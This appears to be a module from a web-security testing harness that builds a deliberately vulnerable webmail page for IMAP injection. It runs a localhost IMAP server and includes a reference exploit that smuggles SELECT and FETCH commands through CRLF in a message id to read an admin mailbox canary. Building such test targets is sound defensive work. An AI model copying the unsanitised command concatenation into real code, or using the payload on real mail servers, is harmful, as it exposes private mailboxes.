// WSTG-INPV-10 (4.7.10) — IMAP Injection behaviour.
// A minimal but real IMAP server runs in-process on a localhost socket. The
// webmail front connects as an IMAP client and builds a FETCH command from the
// user-controlled message id — WITHOUT stripping CRLF. So a message id
// containing \r\n + extra commands (SELECT <admin mailbox>; FETCH) is parsed by
// the server as separate protocol commands, reading a mailbox the user
// shouldn't reach. The admin mailbox's message holds the canary.

import net from 'node:net'
import { Scenario } from './scenario.mjs'

let imapPromise = null
function getImap(canary, scenario) {
  if (!imapPromise) imapPromise = new Promise((resolve, reject) => {
    const mailboxes = {
      INBOX: (scenario.inboxSubjects || ['Welcome']).map((s, i) => `Message ${i + 1}: ${s}`),
      [scenario.adminMailbox]: [`Internal administration note — license_key=${canary}`],
    }
    const server = net.createServer((sock) => {
      let selected = 'INBOX'
      let buf = ''
      sock.write('* OK IMAP4rev1 Service Ready\r\n')
      sock.on('data', (d) => {
        buf += d.toString('utf8')
        let idx
        while ((idx = buf.indexOf('\r\n')) >= 0) {
          const line = buf.slice(0, idx); buf = buf.slice(idx + 2)
          selected = handleLine(sock, line, selected, mailboxes)
        }
      })
      sock.on('error', () => {})
    })
    server.on('error', reject)
    server.listen(0, '127.0.0.1', () => resolve({ port: server.address().port }))
  })
  return imapPromise
}

// Returns the (possibly updated) selected mailbox.
function handleLine(sock, line, selected, mailboxes) {
  const m = line.match(/^(\S+)\s+(\S+)\s*(.*)$/)
  if (!m) { sock.write('* BAD invalid command\r\n'); return selected }
  const tag = m[1], cmd = m[2].toUpperCase(), rest = m[3]
  if (cmd === 'LOGIN') { sock.write(`${tag} OK LOGIN completed\r\n`); return selected }
  if (cmd === 'CAPABILITY') { sock.write(`* CAPABILITY IMAP4rev1\r\n${tag} OK CAPABILITY completed\r\n`); return selected }
  if (cmd === 'LIST') { for (const mb of Object.keys(mailboxes)) sock.write(`* LIST () "." "${mb}"\r\n`); sock.write(`${tag} OK LIST completed\r\n`); return selected }
  if (cmd === 'SELECT') {
    const mb = rest.replace(/^"|"$/g, '').trim()
    if (mailboxes[mb]) { sock.write(`* ${mailboxes[mb].length} EXISTS\r\n${tag} OK [READ-WRITE] SELECT completed\r\n`); return mb }
    sock.write(`${tag} NO mailbox does not exist\r\n`); return selected
  }
  if (cmd === 'FETCH') {
    const id = parseInt((rest.match(/^(\d+)/) || [])[1] || '0', 10)
    const box = mailboxes[selected] || []
    const msg = box[id - 1]
    if (msg) sock.write(`* ${id} FETCH (BODY[TEXT] {${Buffer.byteLength(msg)}}\r\n${msg})\r\n${tag} OK FETCH completed\r\n`)
    else sock.write(`${tag} NO no such message\r\n`)
    return selected
  }
  if (cmd === 'LOGOUT') { sock.write(`* BYE\r\n${tag} OK LOGOUT completed\r\n`); sock.end(); return selected }
  sock.write(`${tag} BAD unknown command\r\n`)
  return selected
}

// Webmail front: connect, login, select INBOX, then FETCH the user's message id
// — concatenated raw into the command (the vulnerability). Collects the full
// server response.
export function imapViewMessage(port, messageId) {
  return new Promise((resolve) => {
    const sock = net.connect(port, '127.0.0.1')
    let out = ''
    let idle
    const finish = () => { try { sock.end() } catch {} ; resolve(out) }
    sock.on('data', (d) => { out += d.toString('utf8'); clearTimeout(idle); idle = setTimeout(finish, 250) })
    sock.on('connect', () => {
      sock.write('a1 LOGIN webmail s3cret\r\n')
      sock.write('a2 SELECT INBOX\r\n')
      sock.write(`a3 FETCH ${messageId} BODY[TEXT]\r\n`) // VULNERABLE: raw concat, no CRLF strip
    })
    sock.on('error', () => resolve(out))
    setTimeout(finish, 4000)
  })
}

const DOVECOT_PORT = 143
function reachable(host, port, timeoutMs = 800) {
  return new Promise((resolve) => {
    const s = net.connect(port, host)
    const done = (ok) => { try { s.destroy() } catch {} ; resolve(ok) }
    s.on('connect', () => done(true))
    s.on('error', () => done(false))
    setTimeout(() => done(false), timeoutMs)
  })
}
// Prefer the real dovecot IMAP server (port 143, started by the container's
// entrypoint); fall back to the in-process minimal server for local dev/self-test.
let portPromise = null
function imapPort(canary, scenario) {
  if (!portPromise) portPromise = (async () => {
    if (await reachable('127.0.0.1', DOVECOT_PORT)) return DOVECOT_PORT
    return (await getImap(canary, scenario)).port
  })()
  return portPromise
}

export const classDef = {
  wstgId: 'WSTG-INPV-10',
  class: 'IMAP/SMTP Injection',
  defenceTiers: [0],
  Scenario,
  needsSignup: false,
  canaryRuntime: true,
  discoveryMode: 'observation',
  discoveryTargetPath: (s) => s.endpoint.path,
  discoveryStaticOk: (s) =>
    typeof s.chromeInjection?.html === 'string' && s.chromeInjection.html.includes(s.endpoint.path),

  matchesRequest({ reqUrl, scenario }) {
    return reqUrl.pathname === scenario.endpoint.path
  },

  async handleRequest({ reqUrl, scenario, renderPage, manifest }) {
    const port = await imapPort(manifest.perDeployCanary, scenario)
    const id = reqUrl.searchParams.get(scenario.messageParam)
    if (id == null || id === '') return { status: 200, body: renderPage(inboxPage(scenario)) }
    const resp = await imapViewMessage(port, id)
    return {
      status: 200,
      body: renderPage(`<section style="max-width:680px;margin:0 auto">
  <h2 style="font-size:20px;margin:0 0 12px">Message</h2>
  <pre style="background:#f3f3f3;padding:12px;border-radius:6px;white-space:pre-wrap">${escapeHtml(extractBodies(resp))}</pre>
  <p style="margin-top:12px"><a href="${scenario.endpoint.path}">← Inbox</a></p>
</section>`),
    }
  },

  // Reference exploit: CRLF-inject a SELECT of the admin mailbox + FETCH.
  async fireExploit({ baseUrl, scenario }) {
    const inj = `1 BODY[TEXT]\r\nz1 SELECT ${scenario.adminMailbox}\r\nz2 FETCH 1 BODY[TEXT]`
    const url = `${baseUrl}${scenario.endpoint.path}?${encodeURIComponent(scenario.messageParam)}=${encodeURIComponent(inj)}`
    const r = await fetch(url, { redirect: 'manual' })
    return { status: r.status, body: await r.text() }
  },

  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
    responseBody.includes(perDeployCanary),
}

export const __test = { getImap, imapViewMessage, extractBodies }

// Pull the message bodies out of the raw IMAP response (between BODY[TEXT] {n}
// and the closing paren), so injected FETCH output surfaces to the webmail view.
function extractBodies(resp) {
  const bodies = []
  const re = /BODY\[TEXT\] \{(\d+)\}\r\n([\s\S]*?)\)\r\n/g
  let m
  while ((m = re.exec(resp))) bodies.push(m[2])
  return bodies.length ? bodies.join('\n---\n') : '(no message content)'
}

function inboxPage(scenario) {
  const items = (scenario.inboxSubjects || []).map((s, i) =>
    `<li style="padding:8px 0;border-bottom:1px solid #eee"><a href="${scenario.endpoint.path}?${encodeURIComponent(scenario.messageParam)}=${i + 1}">${escapeHtml(s)}</a></li>`).join('')
  return `<section style="max-width:680px;margin:0 auto">
  <h2 style="font-size:20px;margin:0 0 8px">${escapeHtml(scenario.featureLabel)}</h2>
  <p style="color:#666;margin:0 0 12px">${escapeHtml(scenario.intro)}</p>
  <ul style="list-style:none;padding:0">${items}</ul>
</section>`
}
function escapeHtml(s) {
  return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}
